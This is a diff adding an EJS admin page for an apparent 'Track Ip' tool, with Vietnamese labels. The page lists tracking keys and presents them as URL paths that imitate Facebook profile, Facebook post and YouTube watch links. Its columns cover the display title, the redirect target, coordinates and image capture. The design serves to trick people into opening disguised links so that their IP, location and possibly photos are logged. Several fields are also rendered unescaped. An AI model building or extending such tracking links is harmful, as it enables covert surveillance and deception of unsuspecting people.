@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track Ip</title>
+    <%- include("../admin/layout/head.ejs") %>
+</head>
+<body>
+    <div class="container">
+        <%- include("../admin/layout/nav.ejs") %>
+        <div class="row" style="margin-bottom:10px; ">
+            <div class="col-md-12">
+                <a href="/track/new" class="btn btn-success pull-right">Thêm mới Track Ip</a>
+            </div>
+        </div>
+
+        <div class="panel panel-default">
+            <div class="panel-heading">
+                Bài đăng
+            </div>
+
+            <div class="panel-body">
+                <div class="table-responsive">
+                    <div class="table-responsive">
+                        <table class="table table-striped table-bordered table-hover">
+                            <thead>
+                                <tr>
+                                    <th>STT</th>
+                                    <th>Title</th>
+                                    <th>Tiêu đề hiển thị</th>
+                                    <th>Link đến</th>
+                                    <th>Nội dung</th>
+                                    <th>Tọa độ</th>
+                                    <th>Hình ảnh</th>
+                                <% if (data && data.trackper==1) { %>
+                                    <th>Tài khoản</th>
+                                <% } %>
+                                    <th>Thời gian tạo</th>
+                                    <th>Tương tác</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% if (data && data.postsip){%>
+                                    <% for (var i= data.postsip.length-1; i > -1; i--) { %>
+                                    <tr>
+                                        <td><%= data.postsip.length-i %> </td> 
+                                        <!-- <td><= data.postsip[i].title %> </td> -->
+                                        <td> 
+                                            <b>Key: </b><a href="/data/<%= data.postsip[i].title %>"><%=data.postsip[i].title %></a> ===> Sử dụng một trong các link sau: <br> 
+                                            <b>1. </b><p class="urlserver">/profile.php?id=<%=data.postsip[i].title %></p>
+                                            <b>2. </b><p class="urlserver">/permalink.php?story_fbid=<%=data.postsip[i].title %></p>
+                                            <b>3. </b><p class="urlserver">/watch?v=<%=data.postsip[i].title %></p>
+                                            <b>4. </b><p class="urlserver">/id=<%=data.postsip[i].title %></p>
+                                            <!-- <b>5. </b><p class="urlserver">/< %=data.postsip[i].title %></p> -->
+                                        </td>
+                                        <td><%- data.postsip[i].titleval %> </td>
+                                        <td><%- data.postsip[i].link %> </td>
+                                        <td><%- data.postsip[i].content %> </td> 
+                                        <!-- <td>< %= data.postsip[i].check_delay %> </td> -->
+                                        <td><%= data.postsip[i].check_geo %> </td>
+                                        <td><%= data.postsip[i].check_img %> </td>
+                                    <% if (data && data.trackper==1) { %>
+                                        <td><%= data.postsip[i].name_user %> </td>
+                                    <% } %>
+                                        <td><%= data.postsip[i].created_at %> </td>  
+                                        <td>
+                                            <!--  -->
+                                            <button href="/track/delete" class="btn btn-danger post_delete" post_id="<%= data.postsip[i].id %>" post_title="<%= data.postsip[i].title %>">Xóa</button>
+                                        </td>
+                                    </tr>
+                                    <% } %>
+                                <% } %>  
+
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> 
+    <script type="text/javascript" src="/static/js/postip.js"></script>
+    <!-- <script type="text/javascript">
+        const URLserver=location.protocol + "//" + document.domain;
+        var p_url_server =  document.getElementsByClassName('urlserver');
+        if (p_url_server && p_url_server.length>0) {
+            for (let i = 0; i < p_url_server.length;i++) {
+              p_url_server[i].textContent=URLserver + p_url_server[i].textContent;
+            };
+        };
+    </script> -->
+</body>
+</html>
